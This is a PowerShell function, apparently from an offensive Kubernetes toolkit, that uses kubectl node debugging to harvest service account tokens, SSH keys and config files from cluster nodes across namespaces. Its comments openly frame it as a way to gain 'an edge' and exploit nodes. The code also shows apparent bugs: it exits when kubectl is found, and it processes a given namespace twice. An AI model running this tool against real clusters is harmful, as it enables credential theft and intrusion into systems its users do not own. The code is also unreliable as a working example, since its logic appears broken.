<#
.SYNOPSIS
Attempts to collect sensitive information from Kubernetes nodes using debugging techniques.

.DESCRIPTION
The `Get-SensitiveInformationFromNode` function employs a series of methods to explore Kubernetes nodes with the intent to gather potentially sensitive data, such as service account tokens, SSH keys, and configuration files. The function checks and utilizes permissions to execute specific commands within specified namespaces and nodes. The operation should only be conducted by authorized personnel due to its intrusive nature and high-impact potential on node operations.

.PARAMETER namespace
Specifies the namespace within which to conduct the exploration. If omitted, the function will attempt the operation across all accessible namespaces.

.PARAMETER token
An optional string token for API authentication. This token is used to verify permissions and execute necessary Kubernetes commands within the cluster's namespaces.

.PARAMETER extensions
Array of custom file extensions to search for within the node's volumes. Defaults to common configuration and key file types if not specified.

.OUTPUTS
Outputs information related to the presence or extraction of sensitive files and tokens from nodes, along with alerts on unsuccessful permission checks.

.EXAMPLE
Get-SensitiveInformationFromNode -namespace "finance" -token "abcd1234" -extensions ".pem", ".cer"

Executes the function to target the "finance" namespace, searching for files with `.pem` and `.cer` extensions.

.EXAMPLE
Get-SensitiveInformationFromNode

Runs the function across all namespaces and checks for default sensitive file types, given the appropriate permissions.

.NOTES
- **Security Warning:** This function can adversely impact node security and stability. Ensure usage is limited to secure environments and authorized users.
- Dependencies include functions like `Get-CanIExecuteInNamespace`, `CatAndWriteinformationFromDebugNode`, and `Get-FileExtensionsFromVolumesInNodes`.
- Requires `kubectl` to perform operations on Kubernetes nodes.
- It is critical to validate permissions and environment readiness before execution.

#>

function Get-SensitiveInformationFromNode{
    [CmdletBinding(SupportsShouldProcess=$true,ConfirmImpact="High")]
    param(
        [Parameter(Mandatory = $false)]
        [string]$namespace,
        [Parameter(Mandatory = $false)]
        [string]$token,
        [Parameter(Mandatory = $false)]
        [string[]]$extensions = @()  # Initialize as an empty array by default
    )
    # Ensure kubectl is available
    if (Test-KubectlInstalledInPath) {
        exit
    }

    if($PSCmdlet.ShouldProcess("clusterNode")){
        Write-Host "Trying different techniques to give you an edge on the system. This can be invasive"
        Write-Host "First verifing if you have rights to debug an node to maby exploit the complete node and retrieve some valuable information"
        if(-not [string]::IsNullOrEmpty($namespace)){
            RetrieveInformationFromNodeWithDebug -namespace $namespace
        }
        $namespacesArray = Get-NameSpaceArray
        foreach ($namespace in $namespacesArray) {
            RetrieveInformationFromNodeWithDebug -namespace $namespace
        }
    }
    
}